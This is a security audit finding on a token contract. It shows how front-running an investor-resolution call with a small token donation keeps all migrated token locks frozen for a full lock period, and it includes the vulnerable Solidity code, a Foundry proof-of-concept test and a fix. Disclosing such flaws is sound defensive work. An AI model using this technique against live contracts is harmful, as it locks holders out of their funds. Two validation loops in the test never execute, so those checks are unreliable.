# [H] Lock Migration Griefing Attack

## Summary
Severity: High
Contest weight: 0.0000
Dataset id: 23317
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
When resolving an investor, the existing locks on the `oldAddress` are migrated to the `newAddress` by appending the locks from the `oldAddress` right at the end of the existing locks on the `newAddress`.

```solidity
function _newAccountSameLocks(address oldAddress, address newAddress) internal {
    //...
    //@audit => locks from `oldAddress` are appended after the existing locks of the `newAddress`
    uint16 len = oldData.endInd - oldData.startInd;
    for (uint16 i = 0; i < len; ++i) {
        @> newData.tokenLockUp[newData.endInd++] = oldData.tokenLockUp[
            oldData.startInd + i
        ];
    }
    newData.tokensLocked += oldData.tokensLocked;
    // reset old user data
    delete $._userData[oldAddress];
}
```

The algorithm that unlocks tokens and calculates available tokens stops iterating over a user's `tokenLockUps` as soon as a lock‑up that has not expired is found.

```solidity
function _unlockTokens(
    address holder,
    uint256 amount,
    bool disregardTime // used by admin actions
) internal returns (uint32 amountUnlocked) {
    //...
    for (uint16 i = userData.startInd; i < len; ++i) {
        // if not disregarding time, then check if the lock up time
        // has been served; if not break out of loop
        //@audit-info => loop exits as soon as a lock that has not reached the lockUpTime is found
        if (
            !disregardTime &&
            @> curTime - userData.tokenLockUp[i].time < lockUpTime
        ) break;
        // if here means this lockup has been served & can be unlocked
        uint32 curEntryAmount = userData.tokenLockUp[i].amount;
        //...
    }
}
function availableTokens(
    address holder
) public view returns (uint256 tokens) {
    //...
    for (uint16 i = userData.startInd; i < len; ++i) {
        LockupEntry memory curEntry = userData.tokenLockUp[i];
        if (curTime - curEntry.time >= lockUpTime) {
            tokens += curEntry.amount;
            //@audit-info => loop exits as soon as a lock that has not reached the lockUpTime is found
        } else {
            @> break;
        }
    }
}
```

The combination of how the tokens are migrated when resolving an investor and the algorithm's short‑circuit behavior allows for a griefing attack. By front‑running the `resolveUser` transaction and donating a `ChildToken` to the `newAddress` before the migration, the donation creates a lock on the `newAddress` for the entire `lockUpDuration`. This lock becomes the first lock of the `newAddress`, causing all the existing locks from the `oldAddress` to be appended after it. Consequently, all migrated tokens remain locked until the donated lock expires, even if their original lock periods have already elapsed.

Impact: Existing lock durations can be gamed, forcing the locks on the `newAddress` to last longer than they should.

## Proof of Concept
```solidity
function test_GrieffAttacToExtendLocksWhenResolving() public {
    uint32 DEFAULT_LOCK_TIME = 365 days;
    uint32 QUART_LOCKTIME = DEFAULT_LOCK_TIME / 4;
    address oldUser = getDomesticUser(1);
    address newUser = getDomesticUser(2);
    address extraInvestor = getDomesticUser(3);
    centralTokenProxy.mint(address(this), uint64(2));
    centralTokenProxy.dynamicTransfer(extraInvestor, 2);
    vm.warp(DEFAULT_LOCK_TIME);
    centralTokenProxy.mint(address(this), uint64(4));
    centralTokenProxy.dynamicTransfer(oldUser, 1);
    // Distribute payout!
    IERC20(address(stableCoin)).approve(address(paySettlerProxy), type(uint256).max);
    paySettlerProxy.distributePayment(address(centralTokenProxy), address(this), 300); // 300 USD(6)
    uint256 snapshot1 = vm.snapshot();
    //@audit-info => Validate each 3 months a new token would've been unlocked!
    for(uint8 i = 1; i == 4; i++) {
        vm.warp(block.timestamp + (QUART_LOCKTIME * i));
        assertEq(d_childTokenProxy.availableTokens(oldUser),i);
    }
    vm.revertTo(snapshot1);
    //@audit-info => Resolving the oldUser without the grieffing attack being executed!
    d_childTokenProxy.resolveUser(oldUser, newUser);
    //@audit-info => Validate each 3 months a new token would've been unlocked, even after the
    // resolve, locks remains as they are,!
    for(uint8 i = 1; i == 4; i++) {
        vm.warp(block.timestamp + (QUART_LOCKTIME * i));
        assertEq(d_childTokenProxy.availableTokens(oldUser),i);
    }
    vm.revertTo(snapshot1);
    assertEq(d_childTokenProxy.availableTokens(oldUser),0);
    // @audit => Frontruns resolveUser
    vm.prank(extraInvestor);
    d_childTokenProxy.transfer(newUser, 1);
    d_childTokenProxy.resolveUser(oldUser, newUser);
    // @audit-issue => Because of the donation prior to resolveUser() was executed, the locks for the
    // migrated tokens are messed up and all the tokens are extended until the lock of the donated
    // token is over!
    // @audit-issue => Migrated tokens from oldUser are locked for an entire year
    vm.warp(block.timestamp + QUART_LOCKTIME);
    assertEq(d_childTokenProxy.availableTokens(newUser),0);
    vm.warp(block.timestamp + QUART_LOCKTIME);
    assertEq(d_childTokenProxy.availableTokens(newUser),0);
    vm.warp(block.timestamp + QUART_LOCKTIME);
    assertEq(d_childTokenProxy.availableTokens(newUser),0);
    // @audit-issue => Only until the donated tokens is unlocked, so are all the migrated tokens
    vm.warp(block.timestamp + QUART_LOCKTIME);
    assertEq(d_childTokenProxy.availableTokens(newUser), 5);
}
```

## Recommendation
Consider refactoring the logic to migrate the locks from the `oldAddress` to the `newAddress`, so that they are not simply appended to the end of the existing locks. Instead, iterate over the existing locks and compare the `tokenLockup.time` to reorder them so that the times of all the locks are correctly ordered sequentially based on the time. This will allow the existing locks on the `oldAddress` to correctly release the tokens on the `newAddress` as soon as they expire.
